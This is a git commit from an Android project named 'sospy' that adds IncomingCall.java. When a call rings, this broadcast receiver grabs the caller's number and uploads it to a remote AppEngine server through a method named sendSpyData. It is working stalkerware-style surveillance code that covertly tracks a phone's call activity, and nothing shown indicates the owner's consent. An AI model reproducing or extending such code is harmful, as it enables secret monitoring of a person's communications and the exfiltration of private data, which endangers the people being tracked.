9a9756e921b3eba6c80ebde9ebd1a3fc9fe0f0ff
Crazyoldman <crazyoldman@gmail.com>
2012-02-29 21:19:58 -0800

    This adds tracking of incoming and outgoing calls (Didnt commit all files first time)

---
+++ spy/src/com/prestomation/android/sospy/spy/IncomingCall.java
@@ -0,0 +1,62 @@
+package com.prestomation.android.sospy.spy;
+
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.os.Bundle;
+import android.telephony.TelephonyManager;
+import android.util.Log;
+
+
+
+public class IncomingCall extends BroadcastReceiver 
+{
+
+    @Override
+    public void onReceive(Context context, Intent intent) 
+    {
+            final Bundle bundle = intent.getExtras();
+            
+            if(null == bundle)
+            {
+            	return;
+            }
+            
+            
+            String state = bundle.getString(TelephonyManager.EXTRA_STATE);
+
+            
+            if(state.equalsIgnoreCase(TelephonyManager.EXTRA_STATE_RINGING))
+            {
+                
+                    final SharedPreferences prefs = Prefs.get(context);
+                    
+                    // Do the actual work in a worker thread. We don't want to tie up
+            		// onStartCommand as this can tie up on UI/prompt a force close
+            		new Thread(new Runnable() 
+            		{
+            			public void run() 
+            			{
+            				String phonenumber = bundle.getString(TelephonyManager.EXTRA_INCOMING_NUMBER);
+            				
+                    		//SharedPreferences.Editor prefsEdit = prefs.edit();
+                    		//String contactName = ContactsUtility.getPhoneNumber(getContentResolver(), phonenumber);
+                    		String devID = prefs.getString(SetupActivity.PREF_DEVICE_ID, null);
+                            AppEngineClient client = new AppEngineClient(devID);
+                            
+                            Log.i(SetupActivity.TAG,"Incoming #: " + phonenumber);
+                            
+                            String title = "Incoming Call from " + phonenumber;
+                            String body = "";
+                            String date = "";
+            				client.sendSpyData(title, body, date);
+            			}
+            		}).start();
+
+            }
+            
+    }
+
+
+}
